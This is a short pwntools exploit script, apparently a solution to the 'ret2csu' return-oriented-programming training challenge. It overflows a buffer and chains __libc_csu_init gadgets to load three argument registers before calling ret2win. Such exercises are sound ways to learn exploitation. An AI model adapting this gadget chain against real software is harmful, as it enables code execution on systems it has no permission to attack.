#!/bin/python3

from pwn import *

elf = ELF("./ret2csu")
p = process(elf.path)

'''
pid = util.proc.pidof(p)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)
'''

param_1 = p64(0xdeadbeefdeadbeef) #rdi
param_2 = p64(0xcafebabecafebabe) #rsi
param_3 = p64(0xd00df00dd00df00d) #rdx

#Gadgets
ret2win = p64(elf.symbols.ret2win)
pop_rdi = p64(0x004006a3)
pop_rbx_rbp_r12_r13_r14_r15 = p64(elf.symbols.__libc_csu_init + 90)
movs_and_call = p64(elf.symbols.__libc_csu_init + 64)

p.recvuntil(">")
payload = b""
payload += b"A" * 40

payload += pop_rbx_rbp_r12_r13_r14_r15
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(0x600e48) #r12
payload += p64(0) #r13
payload += param_2 #r14
payload += param_3 #r15
payload += movs_and_call
payload += p64(0) * 7 # add 8 + (pop * 6)
payload += pop_rdi
payload += param_1
payload += ret2win

p.sendline(payload)
print(p.recvall())

